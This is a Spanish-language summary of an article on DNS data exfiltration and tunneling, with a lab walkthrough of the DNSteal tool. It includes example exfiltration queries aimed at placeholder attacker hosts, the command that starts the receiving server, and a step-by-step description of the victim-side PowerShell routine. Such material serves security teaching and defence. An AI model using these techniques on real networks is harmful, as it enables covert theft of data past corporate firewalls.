Este artículo explica el concepto de **exfiltración y tunelización de datos mediante el protocolo DNS** (DNS Exfiltration & Tunneling) y detalla cómo realizar una demostración práctica utilizando la herramienta **DNSteal**.

---

### **Resumen y Traducción del Contenido**

#### **1. Introducción y Concepto**

El protocolo DNS se utiliza con frecuencia de forma maliciosa debido a que suele estar poco monitoreado y poco restringido dentro de las redes corporativas. Además de la exfiltración de datos (extracción no autorizada), también se utiliza para comandos y control (C2).

Existen **dos variantes** principales para llevar a cabo la exfiltración de datos vía DNS:

* **Variante A: Comunicación Directa con el Servidor DNS del Atacante**
* **Cómo funciona:** El malware alojado en la máquina víctima envía peticiones directamente a la dirección IP del servidor DNS controlado por el atacante en Internet (ejemplo: `nslookup datos_codificados.nombre_archivo IP_DEL_SERVIDOR`).


* **Proceso de envío:**
1. Se codifica el contenido binario del archivo a un conjunto de caracteres válidos para DNS (como Base64 o Hexadecimal).


2. La cadena resultante se divide en bloques (fragmentos) de máximo 250 bytes para no superar el límite de tamaño de un nombre DNS (253 bytes en total).


3. Se añade el nombre del archivo a cada fragmento para poder reconstruir la estructura de archivos en el destino.




* **Ventajas y Desventajas:** Es más eficiente porque no necesita incluir un nombre de dominio completo en la consulta, pero **falla si el firewall corporativo bloquea las salidas DNS directas** no autorizadas hacia Internet.




* **Variante B: Uso de la Cadena Habitual de Resolutores DNS**
* **Cómo funciona:** El malware no consulta directamente al servidor del atacante, sino que realiza peticiones al servidor DNS interno de la empresa. Las peticiones incluyen un subdominio bajo un dominio controlado por el atacante (ejemplo: `datos_codificados.nombre_archivo.dominio_atacante.com`).


* **Ventajas y Desventajas:** Como el servidor DNS interno de la empresa suele tener permitido resolver nombres en Internet, la petición viaja de un servidor a otro hasta llegar al DNS del atacante. Esto permite **evadir las restricciones del firewall**.





---

#### **2. ¿Qué es DNSteal?**

Es un script en Python que implementa el lado del servidor para la exfiltración directa de DNS (Variante A). Escucha en el puerto 53, decodifica los datos entrantes y los guarda en el disco reconfigurando la estructura original del archivo. Además, proporciona un script en PowerShell para ejecutarlo como cliente en el equipo víctima.

*Nota del autor:* En el artículo se utiliza una versión modificada que usa codificación Hexadecimal en lugar de Base64, ya que el comando `Resolve-DnsName` de PowerShell no tolera ciertos caracteres del formato Base64.

---

#### **3. Configuración del Entorno de Prueba (Laboratorio Demo)**

##### **A. Preparación del Servidor (Máquina de Destino / Atacante)**

1. Configurar una máquina Linux con IP estática en Internet.


2. Liberar el puerto 53 (DNS) desactivando el servicio `DNSStubListener` en `/etc/systemd/resolved.conf`:


```ini
DNS=9.9.9.9
DNSStubListener=no

```


3. Reiniciar el servicio de red y verificar que el puerto 53 esté libre (`systemctl restart networking` y `lsof -i :53`).


4. Instalar Python 2 (DNSteal no es compatible con Python 3).


5. Ejecutar DNSteal en el puerto 53:


```bash
python2 dnsteal.py 0.0.0.0 -v

```



##### **B. Ejecución desde el Cliente (Máquina Víctima)**

En la máquina de origen (Windows), mediante PowerShell, se ejecuta un script que realiza lo siguiente:

1. Lee los bytes de los archivos objetivo (`ReadAllBytes`).


2. Convierte los datos binarios a formato Hexadecimal (`ToString X2`).


3. Fragmenta la cadena resultante en bloques pequeños (`Substring`).


4. Envía cada bloque mediante una consulta DNS (`Resolve-DnsName`) dirigida a la IP del servidor objetivo.



Una vez finalizado el envío (tarda entre 1 y 2 minutos para extraer unos 50 KB), se detiene DNSteal en la máquina objetivo mediante `Ctrl + C`. La herramienta unifica los fragmentos y vuelve a generar los archivos recibidos en el directorio local.